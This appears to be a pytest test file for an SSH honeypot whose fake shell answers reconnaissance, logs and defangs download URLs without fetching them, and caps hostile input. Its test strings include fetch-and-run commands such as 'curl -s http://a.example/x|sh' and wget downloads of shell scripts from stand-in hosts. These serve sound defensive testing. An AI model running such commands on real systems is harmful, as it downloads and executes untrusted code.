import asyncio

import asyncssh
import pytest

from app import sensor as sensor_mod
from app.sensor import Sensor, load_host_keys
from app.shell import FakeShell, defang, defang_urls, urls_in


def test_answers_common_recon():
    sh = FakeShell("root")
    assert sh.run("uname -a").startswith("Linux srv-mad-01 6.8.0")
    assert sh.run("whoami") == "root\n"
    assert sh.run("cat /proc/cpuinfo | grep name | wc -l") == "2\n"
    assert sh.run("nproc; id") == "2\nuid=0(root) gid=0(root) groups=0(root)\n"
    assert "Ubuntu 24.04" in sh.run("cat /etc/os-release")
    assert sh.run("frobnicate --now") == "-bash: frobnicate: command not found\n"


def test_quoting_redirects_and_cd():
    sh = FakeShell("root")
    assert sh.run('echo "a;b" 2>/dev/null') == "a;b\n"
    assert sh.run("cd /tmp && pwd") == "/tmp\n"
    assert sh.prompt == "root@srv-mad-01:/tmp# "
    assert "No such file" in sh.run("cd /nope")
    assert sh.run("sh -c 'whoami'") == "root\n"
    sh.run("exit")
    assert sh.done


def test_downloads_are_recorded_never_fetched():
    sh = FakeShell("root")
    out = sh.run("cd /tmp; wget http://evil.example/x.sh; curl -O https://evil.example/m")
    assert "unable to resolve host" in out and "Could not resolve host" in out
    assert urls_in("wget 198.51.100.7/bins.sh; chmod +x bins.sh") == ["http://198.51.100.7/bins.sh"]
    assert urls_in("curl -s http://a.example/x|sh") == ["http://a.example/x"]
    assert defang("http://evil.example/x.sh") == "hxxp[://]evil[.]example/x[.]sh"


def test_unknown_user_and_output_cap():
    sh = FakeShell("'; DROP TABLE")
    assert sh.user == "root"
    assert len(sh.run("cat /proc/cpuinfo;" * 200)) <= 8000


@pytest.fixture
async def shell_sensor(tmp_path):
    events, shell = [], []
    s = Sensor(events.append, record_shell=lambda k, e: shell.append((k, e)))
    await s.start(0, load_host_keys(tmp_path), "OpenSSH_9.6p1", host="127.0.0.1")
    s.events, s.shell = events, shell
    yield s
    await s.stop()


def connect(port, password, username="root"):
    return asyncssh.connect(
        "127.0.0.1", port, username=username, password=password,
        known_hosts=None, client_keys=None, agent_path=None,
    )  # fmt: skip


async def test_weak_password_gets_fake_shell(shell_sensor):
    async with connect(shell_sensor.port, "123456") as conn:
        result = await conn.run("uname -m; wget http://198.51.100.1/x.sh")
        assert result.stdout.startswith("x86_64")
        proc = await conn.create_process(term_type="xterm")
        proc.stdin.write("whoami\nexit\n")
        out = await asyncio.wait_for(proc.stdout.read(), 5)
        assert "root@srv-mad-01:~#" in out and "\r\nroot\r\n" in out
    await asyncio.sleep(0.1)
    assert shell_sensor.events[-1]["accepted"] == 1
    kinds = [k for k, _ in shell_sensor.shell]
    assert kinds[0] == "open" and kinds.count("open") == 1
    cmds = [e for k, e in shell_sensor.shell if k == "command"]
    assert [c["command"] for c in cmds] == [
        "uname -m; wget http://198.51.100.1/x.sh", "whoami", "exit",
    ]  # fmt: skip
    assert cmds[0]["urls"] == "http://198.51.100.1/x.sh"
    assert len({c["session"] for c in cmds}) == 1


async def test_other_passwords_still_refused(shell_sensor):
    with pytest.raises(asyncssh.PermissionDenied):
        async with connect(shell_sensor.port, "Tr0ub4dor&3"):
            pass
    assert shell_sensor.events[-1]["accepted"] == 0
    assert not shell_sensor.shell


async def test_tunnels_and_sftp_refused_but_logged(shell_sensor):
    async with connect(shell_sensor.port, "admin") as conn:
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.open_connection("example.com", 25)
        with pytest.raises((asyncssh.SFTPError, asyncssh.ChannelOpenError, asyncssh.Error)):
            await conn.start_sftp_client()
    await asyncio.sleep(0.1)
    cmds = [e["command"] for k, e in shell_sensor.shell if k == "command"]
    assert "[tunnel to example.com:25]" in cmds


async def test_shell_off_without_recorder(tmp_path):
    events = []
    s = Sensor(events.append)
    await s.start(0, load_host_keys(tmp_path), "OpenSSH_9.6p1", host="127.0.0.1")
    try:
        with pytest.raises(asyncssh.PermissionDenied):
            async with connect(s.port, "123456"):
                pass
    finally:
        await s.stop()


# --- hardening (from the security review) ---------------------------------------


def test_hostile_input_is_fast_and_bounded():
    import time

    start = time.perf_counter()
    assert urls_in("wget " * 20000) == []
    sh = FakeShell("root")
    out = sh.run("cd /proc; cat" + " cpuinfo" * 5000)
    assert len(out) <= 8000
    assert sh.run("sh -c 'sh -c \"sh -c whoami\"'") == "root\n"
    assert time.perf_counter() - start < 1
    assert (
        defang_urls("cd /tmp; wget 198.51.100.7/a.sh") == "cd /tmp; wget 198[.]51[.]100[.]7/a[.]sh"
    )


async def test_huge_exec_command_is_capped(shell_sensor):
    async with connect(shell_sensor.port, "123456") as conn:
        result = await asyncio.wait_for(conn.run("wget " * 40000 + "; whoami"), 5)
        assert "root" not in result.stdout  # the tail beyond the cap is never seen
    await asyncio.sleep(0.1)
    cmd = [e for k, e in shell_sensor.shell if k == "command"][0]["command"]
    assert len(cmd) == sensor_mod.MAX_COMMAND


async def test_subsystems_and_extra_channels_refused(shell_sensor):
    async with connect(shell_sensor.port, "123456") as conn:
        proc = await conn.create_process(subsystem="netconf")
        await asyncio.wait_for(proc.wait(), 5)
        assert proc.exit_status == 1
        for _ in range(sensor_mod.SHELL_MAX_CHANNELS - 1):
            await conn.run("true")
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.run("id")


async def test_ctrl_c_does_not_drop_the_shell(shell_sensor):
    async with connect(shell_sensor.port, "123456") as conn:
        proc = await conn.create_process(term_type="xterm")
        await asyncio.sleep(0.2)
        proc.send_signal("INT")
        proc.stdin.write("whoami\nexit\n")
        out = await asyncio.wait_for(proc.stdout.read(), 5)
        assert "\r\nroot\r\n" in out


def test_daily_quota_per_address():
    s = Sensor(lambda e: None, record_shell=lambda k, e: None)
    allowed = [s.shell_allowed("203.0.113.5") for _ in range(sensor_mod.SHELL_PER_IP_DAY + 3)]
    assert allowed.count(True) == sensor_mod.SHELL_PER_IP_DAY and not allowed[-1]
    assert s.shell_allowed("203.0.113.6")
